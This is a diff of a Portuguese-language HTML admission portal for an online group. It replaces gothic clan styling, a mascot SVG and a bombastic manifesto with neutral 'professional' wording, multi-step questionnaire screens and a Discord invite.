-#themeBtn{
-  position:fixed;top:16px;right:16px;z-index:9997;
-  background:rgba(6,6,6,.9);border:1px solid #1e1e1e;
-  color:#444;font-size:.65rem;padding:6px 12px;cursor:pointer;
-  border-radius:4px;font-family:'Orbitron';letter-spacing:2px;transition:.3s
+#dotBar{
+  position:fixed;bottom:30px;left:50%;transform:translateX(-50%);
+  display:none;gap:10px;z-index:500;align-items:center
 }
-#themeBtn:hover{color:var(--red);border-color:var(--red)}
-#themeMenu{
-  position:fixed;top:44px;right:16px;z-index:9997;
-  background:rgba(6,6,6,.97);border:1px solid #1e1e1e;
-  border-radius:6px;padding:8px;display:none;flex-direction:column;gap:6px;
-  box-shadow:0 12px 40px rgba(0,0,0,.8)
+.dot{width:6px;height:6px;border-radius:50%;background:var(--border);transition:.4s;border:1px solid var(--text-dim)}
+.dot.done{background:var(--text-dim)}
+.dot.now{background:var(--accent);box-shadow:0 0 12px rgba(255,255,255,.4)}
+
+/* ════════════════════════════════════════
+   RESPONSIVE
+════════════════════════════════════════ */
+@media(max-width:768px){
+  .sk-layout{gap:30px}
+  .splash-main-title{font-size:2rem}
+  .splash-subtitle{font-size:.95rem}
+  .cd-wrap{margin-top:40px}
+  .roles-grid{grid-template-columns:repeat(auto-fit,minmax(150px,1fr))}
+  .corner-accent{display:none}
 }
-#themeMenu.open{display:flex}
-.t-opt{
-  font-family:'Orbitron';font-size:.5rem;letter-spacing:2px;padding:7px 14px;
-  cursor:pointer;color:#444;border:1px solid #1a1a1a;border-radius:4px;
-  white-space:nowrap;transition:.25s
-}
-.t-opt:hover{color:#fff;border-color:#2a2a2a}
 
 /* ════════════════════════════════════════
    SHAKE ANIMATION
 ════════════════════════════════════════ */
-@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-7px)}40%{transform:translateX(7px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+@keyframes shake{
+  0%,100%{transform:translateX(0)}
+  20%{transform:translateX(-8px)}
+  40%{transform:translateX(8px)}
+  60%{transform:translateX(-4px)}
+  80%{transform:translateX(4px)}
+}
 .shake{animation:shake .4s ease}
 </style>
 </head>
 <body>
 
 <canvas id="bgCanvas"></canvas>
-<div class="top-bar"></div>
-<div class="corner c-tl"></div>
-<div class="corner c-tr"></div>
-<div class="corner c-bl"></div>
-<div class="corner c-br"></div>
 
-<!-- THEME PICKER -->
-<button id="themeBtn" onclick="toggleTheme()">🎨 TEMA</button>
-<div id="themeMenu">
-  <div class="t-opt" onclick="applyTheme('red')" style="border-left:2px solid #cc0020">◈ SANGUE</div>
-  <div class="t-opt" onclick="applyTheme('purple')" style="border-left:2px solid #8b3fc0">◈ SOMBRA</div>
-  <div class="t-opt" onclick="applyTheme('blue')" style="border-left:2px solid #0066cc">◈ CYBER</div>
-  <div class="t-opt" onclick="applyTheme('green')" style="border-left:2px solid #00802a">◈ MATRIX</div>
-  <div class="t-opt" onclick="applyTheme('gold')" style="border-left:2px solid #b89a0c">◈ ÉLITE</div>
-</div>
+<!-- Corner accents -->
+<div class="corner-accent tl"></div>
+<div class="corner-accent tr"></div>
+<div class="corner-accent bl"></div>
+<div class="corner-accent br"></div>
 
 <!-- PROGRESS DOTS -->
 <div id="dotBar">
@@ -410,115 +427,33 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(
   <div class="dot" id="d6"></div><div class="dot" id="d7"></div>
 </div>
 
-<!-- SlayKitty SVG template -->
-<template id="skTpl">
-<svg class="sk-char" viewBox="0 0 200 320" xmlns="http://www.w3.org/2000/svg">
-  <!-- Cat ears -->
-  <path d="M58 85 L43 42 L75 74" fill="#0a0010" stroke="#6a006a" stroke-width="1.3"/>
-  <path d="M142 85 L157 42 L125 74" fill="#0a0010" stroke="#6a006a" stroke-width="1.3"/>
-  <path d="M59 83 L48 55 L70 72" fill="#4d0066" opacity=".65"/>
-  <path d="M141 83 L152 55 L130 72" fill="#4d0066" opacity=".65"/>
-  <!-- Hair back mass -->
-  <ellipse cx="100" cy="100" rx="57" ry="62" fill="#0b000f"/>
-  <!-- Face -->
-  <ellipse cx="100" cy="114" rx="46" ry="50" fill="#f4c09e"/>
-  <!-- Hair front -->
-  <ellipse cx="100" cy="72" rx="56" ry="34" fill="#0b000f"/>
-  <!-- Side hair strands -->
-  <path d="M53 84 Q42 128 46 162" stroke="#0b000f" stroke-width="23" stroke-linecap="round" fill="none"/>
-  <path d="M147 84 Q158 128 154 162" stroke="#0b000f" stroke-width="23" stroke-linecap="round" fill="none"/>
-  <!-- Hair highlight -->
-  <path d="M76 62 Q97 54 110 59" stroke="#2d0040" stroke-width="3" stroke-linecap="round" opacity=".7"/>
-  <path d="M82 57 Q100 50 112 53" stroke="#3d0055" stroke-width="1.5" stroke-linecap="round" opacity=".4"/>
-
-  <!-- Left eye white -->
-  <ellipse cx="79" cy="116" rx="14.5" ry="15.5" fill="white"/>
-  <ellipse cx="79" cy="119" rx="10" ry="11" fill="#56008f"/>
-  <ellipse cx="79" cy="119" rx="6.5" ry="7" fill="#050005"/>
-  <circle cx="84" cy="113" r="3.2" fill="white"/>
-  <circle cx="77" cy="123" r="1.5" fill="white" opacity=".4"/>
-  <!-- Left lashes -->
-  <path d="M65 110 L70 115" stroke="#050005" stroke-width="1.4" stroke-linecap="round"/>
-  <path d="M67 106 L71 112" stroke="#050005" stroke-width="1.4" stroke-linecap="round"/>
-  <path d="M93 109 L88 114" stroke="#050005" stroke-width="1.4" stroke-linecap="round"/>
-  <path d="M91 106 L87 112" stroke="#050005" stroke-width="1.3" stroke-linecap="round"/>
-
-  <!-- Right eye white -->
-  <ellipse cx="121" cy="116" rx="14.5" ry="15.5" fill="white"/>
-  <ellipse cx="121" cy="119" rx="10" ry="11" fill="#56008f"/>
-  <ellipse cx="121" cy="119" rx="6.5" ry="7" fill="#050005"/>
-  <circle cx="126" cy="113" r="3.2" fill="white"/>
-  <circle cx="119" cy="123" r="1.5" fill="white" opacity=".4"/>
-  <!-- Right lashes -->
-  <path d="M135 110 L130 115" stroke="#050005" stroke-width="1.4" stroke-linecap="round"/>
-  <path d="M133 106 L129 112" stroke="#050005" stroke-width="1.4" stroke-linecap="round"/>
-  <path d="M107 109 L112 114" stroke="#050005" stroke-width="1.4" stroke-linecap="round"/>
-  <path d="M109 106 L113 112" stroke="#050005" stroke-width="1.3" stroke-linecap="round"/>
-
-  <!-- Blush -->
-  <ellipse cx="64" cy="130" rx="10" ry="5" fill="#ff9ca3" opacity=".38"/>
-  <ellipse cx="136" cy="130" rx="10" ry="5" fill="#ff9ca3" opacity=".38"/>
-  <!-- Nose -->
-  <path d="M96 137 Q100 141 104 137" stroke="#c07880" stroke-width="1.2" fill="none" stroke-linecap="round"/>
-  <!-- Mouth -->
-  <path class="skMouth" d="M87 146 Q100 157 113 146" stroke="#c07880" stroke-width="1.8" fill="none" stroke-linecap="round"/>
-
-  <!-- Neck -->
-  <rect x="87" y="160" width="26" height="18" rx="4" fill="#f4c09e"/>
-  <!-- Choker -->
-  <rect x="80" y="158" width="40" height="8" rx="4" fill="#0a0010"/>
-  <circle cx="100" cy="162" r="3.5" fill="#8b0015"/>
-  <circle cx="88" cy="162" r="1.5" fill="#3d0055" opacity=".7"/>
-  <circle cx="112" cy="162" r="1.5" fill="#3d0055" opacity=".7"/>
-
-  <!-- Body dress (dark gothic) -->
-  <path d="M48 182 Q68 166 88 166 L100 177 L112 166 Q132 166 152 182 L158 268 L42 268 Z" fill="#090012"/>
-  <path d="M88 166 L100 182 L112 166" fill="#12001c" stroke="#2d0040" stroke-width=".7"/>
-  <!-- Center line detail -->
-  <line x1="100" y1="182" x2="100" y2="268" stroke="#2d0040" stroke-width=".8" opacity=".6"/>
-  <!-- Lace trim at waist -->
-  <path d="M48 210 Q74 218 100 210 Q126 202 152 210" stroke="#1a0028" stroke-width="1.5" fill="none" opacity=".8"/>
-  <!-- Stars on dress -->
-  <text x="68" y="230" font-size="9" fill="#2d0040" opacity=".7">✦</text>
-  <text x="122" y="224" font-size="7" fill="#2d0040" opacity=".5">✦</text>
-  <text x="91" y="248" font-size="6" fill="#8b0015" opacity=".5">✦</text>
-  <text x="78" y="198" font-size="5" fill="#3d0055" opacity=".4">✦</text>
-  <text x="115" y="203" font-size="5" fill="#3d0055" opacity=".4">✦</text>
-
-  <!-- Left arm -->
-  <path d="M50 182 Q29 188 26 228 Q26 248 38 255" stroke="#090012" stroke-width="23" stroke-linecap="round" fill="none"/>
-  <!-- Right arm -->
-  <path d="M150 182 Q171 188 174 228 Q174 248 162 255" stroke="#090012" stroke-width="23" stroke-linecap="round" fill="none"/>
-  <!-- Left hand -->
-  <ellipse cx="36" cy="257" rx="14" ry="11" fill="#f4c09e"/>
-  <!-- Right hand -->
-  <ellipse cx="164" cy="257" rx="14" ry="11" fill="#f4c09e"/>
-  <!-- Glove cuffs -->
-  <rect x="25" y="248" width="24" height="7" rx="3.5" fill="#090012"/>
-  <rect x="151" y="248" width="24" height="7" rx="3.5" fill="#090012"/>
-
-  <!-- Skirt flare -->
-  <path d="M42 256 Q46 310 60 322 L140 322 Q154 310 158 256 Z" fill="#0d0018"/>
-  <path d="M58 322 L142 322" stroke="#2d0040" stroke-width="1.8"/>
-  <!-- Skirt ruffles -->
-  <path d="M42 270 Q71 278 100 270 Q129 262 158 270" stroke="#120020" stroke-width="2" fill="none" opacity=".8"/>
-  <path d="M44 285 Q72 292 100 285 Q128 278 156 285" stroke="#120020" stroke-width="1.5" fill="none" opacity=".5"/>
-</svg>
-</template>
-
 <!-- ══════════════════════════
-     S0: SPLASH
+     S0: SPLASH PROFISSIONAL
 ══════════════════════════ -->
 <div class="screen active" id="s0">
   <div class="splash-wrap">
-    <h1 class="sc-title" data-t="Sombra Coletiva">Sombra Coletiva</h1>
-    <p class="splash-tag">◈ PORTAL DE ADMISSÃO ◈</p>
-    <div class="cd-wrap" id="cd0">
+    <div class="splash-logo-container">
+      <div class="splash-logo">◈</div>
+      <h1 class="splash-main-title">Portal Profissional</h1>
+      <p class="splash-subtitle">Sistema de Admissão — Faça Parte da Elite</p>
+    </div>
+    
+    <div class="progress-container">
+      <div class="progress-line">
+        <div class="progress-fill"></div>
+      </div>
+      <div class="progress-text">
+        <span>Preparando Sistema</span>
+        <span class="progress-num"><span id="prog-num">0</span>%</span>
+      </div>
+    </div>
+
+    <div class="cd-wrap">
       <div class="cd-ring">
-        <svg viewBox="0 0 82 82"><circle class="r-bg" cx="41" cy="41" r="36"/><circle class="r-fg" id="rf0" cx="41" cy="41" r="36" stroke-dasharray="226" stroke-dashoffset="0"/></svg>
+        <svg viewBox="0 0 100 100"><circle class="r-bg" cx="50" cy="50" r="40"/><circle class="r-fg" id="rf0" cx="50" cy="50" r="40" stroke-dasharray="251" stroke-dashoffset="0"/></svg>
         <div class="cd-num" id="cn0">10</div>
       </div>
-      <button class="btn btn-main hidden" id="b0" onclick="go(1)">◈ CONTINUAR ◈</button>
+      <button class="btn btn-main hidden" id="b0" onclick="go(1)">CONTINUAR <i class="fas fa-arrow-right"></i></button>
     </div>
   </div>
 </div>
@@ -531,17 +466,17 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(
     <div class="warn-icon">⚠</div>
     <div class="hr-glow"></div>
     <p class="warn-text">
-      Calma... você sabe o que<br>
-      <em>nós fazemos</em> antes de<br>
-      entrar para a <em>família</em>?
+      Você está prestes a solicitar<br>
+      sua admissão em nossa <em>organização</em>.<br>
+      Tem certeza de que está pronto?
     </p>
     <div class="hr-glow"></div>
     <div class="cd-wrap">
       <div class="cd-ring">
-        <svg viewBox="0 0 82 82"><circle class="r-bg" cx="41" cy="41" r="36"/><circle class="r-fg" id="rf1" cx="41" cy="41" r="36" stroke-dasharray="226" stroke-dashoffset="0"/></svg>
+        <svg viewBox="0 0 100 100"><circle class="r-bg" cx="50" cy="50" r="40"/><circle class="r-fg" id="rf1" cx="50" cy="50" r="40" stroke-dasharray="251" stroke-dashoffset="0"/></svg>
         <div class="cd-num" id="cn1">5</div>
       </div>
-      <button class="btn btn-main hidden" id="b1" onclick="go(2)">◈ CONTINUAR ◈</button>
+      <button class="btn btn-main hidden" id="b1" onclick="go(2)">CONTINUAR <i class="fas fa-arrow-right"></i></button>
     </div>
   </div>
 </div>
@@ -551,23 +486,21 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(
 ══════════════════════════ -->
 <div class="screen scroll-screen" id="s2">
   <div class="manifesto-box">
-    <div class="m-header">✨ ─── 🍷 • sombra coletiva • 🩸 ─── ✨</div>
-    <div class="m-crown">👑 PROPÓSITOS • SC</div>
-    <div class="m-line" id="ml0"><span class="m-ico">⚔️</span><span><strong>Combate:</strong> Aniquilar abusos e toxicidade virtual com precisão cirúrgica. Zero tolerância.</span></div>
-    <div class="m-line" id="ml1"><span class="m-ico">🔒</span><span><strong>Defesa:</strong> Preservar a privacidade e a integridade absoluta de cada membro da família.</span></div>
-    <div class="m-line" id="ml2"><span class="m-ico">👁️</span><span><strong>Exposição:</strong> Investigar e expor crimes cibernéticos. A sombra enxerga tudo — sempre.</span></div>
-    <div class="m-line" id="ml3"><span class="m-ico">🩸</span><span><strong>Justiça:</strong> Retaliação direta e implacável contra sabotadores e traidores. Sem piedade.</span></div>
-    <div class="m-line" id="ml4"><span class="m-ico">🧠</span><span><strong>Inteligência:</strong> Avançar continuamente em conhecimento tecnológico e estratégia de alto nível.</span></div>
-    <div class="m-line" id="ml5"><span class="m-ico">🌐</span><span><strong>Soberania:</strong> Impor respeito absoluto em todo o cenário digital. Ninguém nos desafia duas vezes.</span></div>
-    <div class="m-footer" id="mf">🔱 &nbsp; A ELITE PERMANECE INTOCÁVEL &nbsp; 🔱</div>
-    <div style="margin-top:44px">
-      <div class="cd-wrap">
-        <div class="cd-ring">
-          <svg viewBox="0 0 82 82"><circle class="r-bg" cx="41" cy="41" r="36"/><circle class="r-fg" id="rf2" cx="41" cy="41" r="36" stroke-dasharray="226" stroke-dashoffset="0"/></svg>
-          <div class="cd-num" id="cn2">20</div>
-        </div>
-        <button class="btn btn-main hidden" id="b2" onclick="startLoad()">◈ PROSSEGUIR ◈</button>
+    <div class="m-header">─── PRINCÍPIOS ORGANIZACIONAIS ───</div>
+    <div class="m-line" id="ml0"><span class="m-ico">→</span><span><strong>Excelência:</strong> Buscamos os melhores talentos para nosso círculo exclusivo.</span></div>
+    <div class="m-line" id="ml1"><span class="m-ico">→</span><span><strong>Integridade:</strong> Membros precisam demonstrar caráter irrefutável e confiabilidade.</span></div>
+    <div class="m-line" id="ml2"><span class="m-ico">→</span><span><strong>Compromisso:</strong> Envolvimento ativo e participação nas atividades do grupo.</span></div>
+    <div class="m-line" id="ml3"><span class="m-ico">→</span><span><strong>Respeito:</strong> Hierarquia e protocolos são fundamentais para a organização.</span></div>
+    <div class="m-line" id="ml4"><span class="m-ico">→</span><span><strong>Confidencialidade:</strong> O que é discutido aqui, fica aqui. Sempre.</span></div>
+    <div class="m-line" id="ml5"><span class="m-ico">→</span><span><strong>Crescimento:</strong> Continuaremos evoluindo e aprimorando nossa estrutura constantemente.</span></div>
+    <div class="m-footer" id="mf">█ SOMENTE CANDIDATOS QUALIFICADOS PROSSEGUEM █</div>
+    
+    <div class="cd-wrap" style="margin-top:60px">
+      <div class="cd-ring">
+        <svg viewBox="0 0 100 100"><circle class="r-bg" cx="50" cy="50" r="40"/><circle class="r-fg" id="rf2" cx="50" cy="50" r="40" stroke-dasharray="251" stroke-dashoffset="0"/></svg>
+        <div class="cd-num" id="cn2">15</div>
       </div>
+      <button class="btn btn-main hidden" id="b2" onclick="startLoad()">PROSSEGUIR <i class="fas fa-arrow-right"></i></button>
     </div>
   </div>
 </div>
@@ -577,117 +510,109 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(
 ══════════════════════════ -->
 <div class="screen" id="s3">
   <div class="load-box">
-    <div class="loader-rig">
-      <div class="ld-ring ld-r1"></div>
-      <div class="ld-ring ld-r2"></div>
-      <div class="ld-ring ld-r3"></div>
-      <div class="ld-ring ld-r4"></div>
-      <div class="ld-core">SC</div>
+    <div class="loader-minimal">
+      <div class="ld-line ld-line-1"></div>
+      <div class="ld-line ld-line-2"></div>
+      <div class="ld-line ld-line-3"></div>
     </div>
-    <div class="ld-phase" id="ldPh">INICIALIZANDO SISTEMA...</div>
+    <div class="ld-phase" id="ldPh">INICIALIZANDO SISTEMA</div>
     <div class="ld-bar-w"><div class="ld-bar" id="ldBar"></div></div>
     <div class="ld-pct" id="ldPct">0%</div>
   </div>
 </div>
 
 <!-- ══════════════════════════
-     S4: Q NOME
+     S4: NOME
 ══════════════════════════ -->
 <div class="screen" id="s4">
   <div class="sk-layout">
-    <div id="sk4"></div>
     <div class="sk-panel">
       <div class="bubble">
-        <div class="bubble-name">✦ SLAYKTTY</div>
-        <div class="bubble-text">Por favor, senhor(a)... digite o seu <strong>nome</strong>.</div>
+        <div class="bubble-name">Sistema</div>
+        <div class="bubble-text">Qual é o seu <strong>nome</strong>?</div>
       </div>
-      <div class="sk-field"><input class="sk-input" id="i_name" placeholder="Seu nome ou vulgo..." maxlength="50" onkeydown="ek(event,'name','i_name',5)"/></div>
-      <button class="btn btn-send" onclick="ans('name','i_name',5)"><i class="fas fa-arrow-right"></i> ENVIAR</button>
+      <div class="sk-field"><input class="sk-input" id="i_name" placeholder="Digite seu nome..." maxlength="50" onkeydown="ek(event,'name','i_name',5)"/></div>
+      <button class="btn btn-send" onclick="ans('name','i_name',5)">ENVIAR <i class="fas fa-arrow-right"></i></button>
     </div>
   </div>
 </div>
 
 <!-- ══════════════════════════
-     S5: Q IDADE
+     S5: IDADE
 ══════════════════════════ -->
 <div class="screen" id="s5">
   <div class="sk-layout">
-    <div id="sk5"></div>
     <div class="sk-panel">
       <div class="bubble">
-        <div class="bubble-name">✦ SLAYKTTY</div>
-        <div class="bubble-text">Por favor, senhor(a)... agora informe a sua <strong>idade</strong>.</div>
+        <div class="bubble-name">Sistema</div>
+        <div class="bubble-text">Qual é a sua <strong>idade</strong>?</div>
       </div>
-      <div class="sk-field"><input class="sk-input" id="i_age" type="number" placeholder="Sua idade..." min="1" max="99" onkeydown="ek(event,'age','i_age',6)"/></div>
-      <button class="btn btn-send" onclick="ans('age','i_age',6)"><i class="fas fa-arrow-right"></i> ENVIAR</button>
+      <div class="sk-field"><input class="sk-input" id="i_age" type="number" placeholder="Sua idade..." min="18" max="120" onkeydown="ek(event,'age','i_age',6)"/></div>
+      <button class="btn btn-send" onclick="ans('age','i_age',6)">ENVIAR <i class="fas fa-arrow-right"></i></button>
     </div>
   </div>
 </div>
 
 <!-- ══════════════════════════
-     S6: Q RECRUTADOR
+     S6: RECRUTADOR
 ══════════════════════════ -->
 <div class="screen" id="s6">
   <div class="sk-layout">
-    <div id="sk6"></div>
     <div class="sk-panel">
       <div class="bubble">
-        <div class="bubble-name">✦ SLAYKTTY</div>
-        <div class="bubble-text">Por favor, senhor(a)... <strong>quem te recrutou</strong> para a família?</div>
+        <div class="bubble-name">Sistema</div>
+        <div class="bubble-text">Quem foi seu <strong>recrutador</strong>?</div>
       </div>
       <div class="sk-field"><input class="sk-input" id="i_rec" placeholder="Nome do recrutador..." onkeydown="ek(event,'recruiter','i_rec',7)"/></div>
-      <button class="btn btn-send" onclick="ans('recruiter','i_rec',7)"><i class="fas fa-arrow-right"></i> ENVIAR</button>
+      <button class="btn btn-send" onclick="ans('recruiter','i_rec',7)">ENVIAR <i class="fas fa-arrow-right"></i></button>
     </div>
   </div>
 </div>
 
 <!-- ══════════════════════════
-     S7: Q TEMPO FAMÍLIA
+     S7: TEMPO FAMÍLIA
 ══════════════════════════ -->
 <div class="screen" id="s7">
   <div class="sk-layout">
-    <div id="sk7"></div>
     <div class="sk-panel">
       <div class="bubble">
-        <div class="bubble-name">✦ SLAYKTTY</div>
-        <div class="bubble-text">Você conhece a <strong>família</strong> há quanto tempo, senhor(a)?</div>
+        <div class="bubble-name">Sistema</div>
+        <div class="bubble-text">Há quanto tempo você conhece a <strong>organização</strong>?</div>
       </div>
-      <div class="sk-field"><input class="sk-input" id="i_fam" placeholder="Ex: 2 meses, 1 ano..." onkeydown="ek(event,'famTime','i_fam',8)"/></div>
-      <button class="btn btn-send" onclick="ans('famTime','i_fam',8)"><i class="fas fa-arrow-right"></i> ENVIAR</button>
+      <div class="sk-field"><input class="sk-input" id="i_fam" placeholder="Ex: 6 meses, 1 ano..." onkeydown="ek(event,'famTime','i_fam',8)"/></div>
+      <button class="btn btn-send" onclick="ans('famTime','i_fam',8)">ENVIAR <i class="fas fa-arrow-right"></i></button>
     </div>
   </div>
 </div>
 
 <!-- ══════════════════════════
-     S8: Q TEMPO APP
+     S8: TEMPO APP
 ══════════════════════════ -->
 <div class="screen" id="s8">
   <div class="sk-layout">
-    <div id="sk8"></div>
     <div class="sk-panel">
       <div class="bubble">
-        <div class="bubble-name">✦ SLAYKTTY</div>
-        <div class="bubble-text">Hhhmmm... você usa o <strong>aplicativo</strong> há muito tempo?</div>
+        <div class="bubble-name">Sistema</div>
+        <div class="bubble-text">Há quanto tempo usa o <strong>aplicativo</strong>?</div>
       </div>
-      <div class="sk-field"><input class="sk-input" id="i_app" placeholder="Ex: 6 meses, 3 anos..." onkeydown="ek(event,'appTime','i_app',9)"/></div>
-      <button class="btn btn-send" onclick="ans('appTime','i_app',9)"><i class="fas fa-arrow-right"></i> ENVIAR</button>
+      <div class="sk-field"><input class="sk-input" id="i_app" placeholder="Ex: 3 meses, 2 anos..." onkeydown="ek(event,'appTime','i_app',9)"/></div>
+      <button class="btn btn-send" onclick="ans('appTime','i_app',9)">ENVIAR <i class="fas fa-arrow-right"></i></button>
     </div>
   </div>
 </div>
 
 <!-- ══════════════════════════
-     S9: Q ID
+     S9: ID
 ══════════════════════════ -->
 <div class="screen" id="s9">
   <div class="sk-layout">
-    <div id="sk9"></div>
     <div class="sk-panel">
       <div class="bubble">
-        <div class="bubble-name">✦ SLAYKTTY</div>
-        <div class="bubble-text">Hhmm, interessante... e qual é o seu <strong>ID</strong>?</div>
+        <div class="bubble-name">Sistema</div>
+        <div class="bubble-text">Qual é o seu <strong>ID de usuário</strong>?</div>
       </div>
       <div class="sk-field"><input class="sk-input" id="i_id" placeholder="Seu ID..." onkeydown="ek(event,'userId','i_id',10)"/></div>
-      <button class="btn btn-send" onclick="ans('userId','i_id',10)"><i class="fas fa-arrow-right"></i> ENVIAR</button>
+      <button class="btn btn-send" onclick="ans('userId','i_id',10)">ENVIAR <i class="fas fa-arrow-right"></i></button>
     </div>
   </div>
 </div>
@@ -698,28 +623,27 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(
 <div class="screen scroll-screen" id="s10">
   <div class="roles-outer">
     <div class="roles-header">
-      <div id="sk10" style="flex-shrink:0"></div>
-      <div class="bubble" style="flex:1;border-radius:12px;margin-bottom:0">
-        <div class="bubble-name">✦ SLAYKTTY</div>
-        <div class="bubble-text">Escolha a sua <strong>função</strong>, senhor(a)...</div>
+      <div class="bubble" style="flex:1;border-radius:0;margin-bottom:0">
+        <div class="bubble-name">Sistema</div>
+        <div class="bubble-text">Escolha sua <strong>função</strong> na organização</div>
       </div>
     </div>
     <div class="roles-grid">
-      <div class="r-card" onclick="pickRole(this,'Organizador')"><div class="r-name">📋 Organizador</div><div class="r-desc">Mantém a ordem e estrutura da família</div></div>
-      <div class="r-card" onclick="pickRole(this,'Recrutador')"><div class="r-name">📡 Recrutador</div><div class="r-desc">Traz novos membros para a família</div></div>
-      <div class="r-card" onclick="pickRole(this,'Vigilante')"><div class="r-name">👁️ Vigilante</div><div class="r-desc">Monitora e protege o território</div></div>
-      <div class="r-card" onclick="pickRole(this,'Designer')"><div class="r-name">🎨 Designer</div><div class="r-desc">Cria a identidade visual do grupo</div></div>
-      <div class="r-card" onclick="pickRole(this,'Organizador de Tretas')"><div class="r-name">⚡ Org. de Tretas</div><div class="r-desc">Coordena operações e confrontos</div></div>
-      <div class="r-card" onclick="pickRole(this,'Gerente de Parcerias')"><div class="r-name">🤝 Ger. Parcerias</div><div class="r-desc">Negocia alianças externas</div></div>
-      <div class="r-card" onclick="pickRole(this,'Gestor de Alianças Estratégicas')"><div class="r-name">🌐 Alianças Estratégicas</div><div class="r-desc">Gerencia relações de alto nível</div></div>
-      <div class="r-card" onclick="pickRole(this,'Mestre do Hype / Animador de Chat')"><div class="r-name">🎤 Mestre do Hype</div><div class="r-desc">Anima o chat e engaja o público sem deixar a transmissão flopar</div></div>
-      <div class="r-card" onclick="pickRole(this,'Derruba-Hater')"><div class="r-name">🔨 Derruba-Hater</div><div class="r-desc">Bane e elimina quem fala mal da TAG</div></div>
-      <div class="r-card" onclick="pickRole(this,'Segurança')"><div class="r-name">🛡️ Segurança</div><div class="r-desc">Proteção direta dos membros</div></div>
-      <div class="r-card" onclick="pickRole(this,'Conselheiro')"><div class="r-name">🧠 Conselheiro</div><div class="r-desc">Orienta e aconselha a liderança</div></div>
-      <div class="r-card" onclick="pickRole(this,'Contrabandista de Gringo')"><div class="r-name">🌎 Contrab. de Gringo</div><div class="r-desc">Traz contas estrangeiras para render dentro da call</div></div>
+      <div class="r-card" onclick="pickRole(this,'Organizador')"><div class="r-name">Organizador</div><div class="r-desc">Estrutura e planejamento</div></div>
+      <div class="r-card" onclick="pickRole(this,'Recrutador')"><div class="r-name">Recrutador</div><div class="r-desc">Busca de talentos</div></div>
+      <div class="r-card" onclick="pickRole(this,'Analista')"><div class="r-name">Analista</div><div class="r-desc">Pesquisa e dados</div></div>
+      <div class="r-card" onclick="pickRole(this,'Designer')"><div class="r-name">Designer</div><div class="r-desc">Identidade visual</div></div>
+      <div class="r-card" onclick="pickRole(this,'Operacional')"><div class="r-name">Operacional</div><div class="r-desc">Execução de projetos</div></div>
+      <div class="r-card" onclick="pickRole(this,'Estrategista')"><div class="r-name">Estrategista</div><div class="r-desc">Planejamento estratégico</div></div>
+      <div class="r-card" onclick="pickRole(this,'Gerente de Parcerias')"><div class="r-name">Parcerias</div><div class="r-desc">Relações externas</div></div>
+      <div class="r-card" onclick="pickRole(this,'Comunicação')"><div class="r-name">Comunicação</div><div class="r-desc">Gestão de mensagens</div></div>
+      <div class="r-card" onclick="pickRole(this,'Moderação')"><div class="r-name">Moderação</div><div class="r-desc">Ambiente seguro</div></div>
+      <div class="r-card" onclick="pickRole(this,'Segurança')"><div class="r-name">Segurança</div><div class="r-desc">Proteção de membros</div></div>
+      <div class="r-card" onclick="pickRole(this,'Conselheiro')"><div class="r-name">Conselheiro</div><div class="r-desc">Orientação estratégica</div></div>
+      <div class="r-card" onclick="pickRole(this,'Trainee')"><div class="r-name">Trainee</div><div class="r-desc">Programa de desenvolvimento</div></div>
     </div>
-    <div style="text-align:center;margin-top:20px">
-      <button class="btn btn-main" id="roleConfirm" disabled onclick="go(11)" style="margin:0 auto">◈ CONFIRMAR FUNÇÃO ◈</button>
+    <div style="text-align:center;margin-top:30px">
+      <button class="btn btn-main" id="roleConfirm" disabled onclick="go(11)">CONFIRMAR FUNÇÃO <i class="fas fa-check"></i></button>
     </div>
   </div>
 </div>
@@ -729,24 +653,19 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(
 ══════════════════════════ -->
 <div class="screen" id="s11">
   <div class="discord-wrap">
-    <div id="sk11" style="display:flex;justify-content:center;margin-bottom:14px"></div>
-    <div class="bubble" style="border-radius:12px;text-align:left">
-      <div class="bubble-name">✦ SLAYKTTY</div>
-      <div class="bubble-text">Que tal entrar no nosso <strong>servidor</strong>? A família está te esperando... 🩸</div>
+    <div class="bubble" style="border-radius:0;text-align:left;margin-bottom:25px">
+      <div class="bubble-name">Sistema</div>
+      <div class="bubble-text">Sua candidatura foi recebida. Deseja conectar-se ao <strong>servidor oficial</strong>?</div>
     </div>
     <div class="dc-card">
       <div class="dc-icon"><i class="fab fa-discord"></i></div>
-      <div class="dc-name">SOMBRA COLETIVA</div>
-      <div class="dc-sub">Servidor Oficial &nbsp;•&nbsp; TNT Network</div>
-      <div class="dc-members">
-        <span class="dc-online"><i class="fas fa-circle" style="font-size:.45rem"></i> Online</span>
-        <span><i class="fas fa-users" style="font-size:.65rem"></i> Membros</span>
-      </div>
+      <div class="dc-name">Servidor Oficial</div>
+      <div class="dc-sub">Comunidade Profissional</div>
       <div class="dc-link">discord.gg/GgYCbMAuX</div>
     </div>
     <div class="dc-btns">
-      <button class="btn btn-accept" onclick="dcAccept()"><i class="fas fa-check"></i> &nbsp;ACEITAR</button>
-      <button class="btn btn-refuse" onclick="dcRefuse()"><i class="fas fa-times"></i> &nbsp;RECUSAR</button>
+      <button class="btn btn-accept" onclick="dcAccept()"><i class="fas fa-check"></i> ACEITAR</button>
+      <button class="btn btn-refuse" onclick="dcRefuse()"><i class="fas fa-times"></i> RECUSAR</button>
     </div>
   </div>
 </div>
@@ -756,50 +675,44 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(
 ══════════════════════════ -->
 <div class="screen" id="s12">
   <div class="done-wrap">
-    <div class="done-symbol">🩸</div>
-    <div class="done-title">SOLICITAÇÃO ENVIADA</div>
+    <div class="done-symbol">✓</div>
+    <div class="done-title">Candidatura Enviada</div>
     <div class="hr-thin"></div>
     <div class="done-name">BEM-VINDO(A), <span id="doneName"></span></div>
-    <div class="done-info" style="margin-top:10px">Aguarde o contato de um recrutador.</div>
-    <div style="margin-top:30px;font-size:1.8rem;opacity:.5;letter-spacing:14px">🔱 ✦ 🔱</div>
+    <div class="done-info">Sua solicitação foi recebida. Aguarde contato.</div>
   </div>
 </div>
 
 <script>
 /* ════════════════════════════════════════
-   CANVAS BACKGROUND — PARTICLES + GRID
